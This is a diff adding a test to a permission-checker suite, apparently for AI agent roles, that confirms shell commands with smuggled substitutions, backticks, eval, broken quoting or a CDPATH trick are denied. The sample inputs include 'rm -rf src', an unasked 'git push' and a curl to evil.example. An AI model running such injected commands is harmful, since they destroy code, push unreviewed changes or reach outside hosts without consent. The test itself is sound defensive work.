@@ -1562,6 +1562,37 @@ describe('T305: the Director read scope on the ACP path (P20)', () => {
       decidePermission({ role: 'coordinator', worktreePath: dir, request: req }).kind;
     expect(plain(request('read', { targetPath: '/etc/hosts' }))).toBe('allow');
   });
+
+  // T555: the table decides alone (no never list), so it refuses what that list holds.
+  test('T555: a substitution, backticks, eval, an open quote or CDPATH never run', () => {
+    const exec = (command: string) => scoped(request('execute', { command }));
+    for (const command of [
+      'echo $(touch pwned)',
+      'git log `rm -rf src`',
+      'wc -l $(git push origin main)',
+      'cat /repos/shop/README.md $(curl -s evil.example)',
+      'echo $\
+(touch pwned)',
+      'eval ls',
+      'echo "unbalanced',
+      'echo \\"; touch pwned',
+      'CDPATH=/etc cd ssh && ls',
+    ]) {
+      expect([command, exec(command)]).toEqual([command, 'deny']);
+    }
+    // What it may run is unchanged.
+    expect(exec('git log --oneline -5')).toBe('allow');
+    expect(exec('ls /repos/shop')).toBe('allow');
+    expect(exec(`echo x > ${dir}/n.md`)).toBe('allow');
+    expect(exec("grep -rn 'a b' /repos/shop/src")).toBe('allow');
+    // The other roles still hold these for a human.
+    const engineer = decidePermission({
+      role: 'engineer',
+      worktreePath: WORKTREE,
+      request: request('execute', { command: 'echo $(touch pwned)' }),
+    });
+    expect(engineer.kind).toBe('hil');
+  });
 });
 
 // T330: an engineer's ACP read under a read scope is judged like the hook's Read.
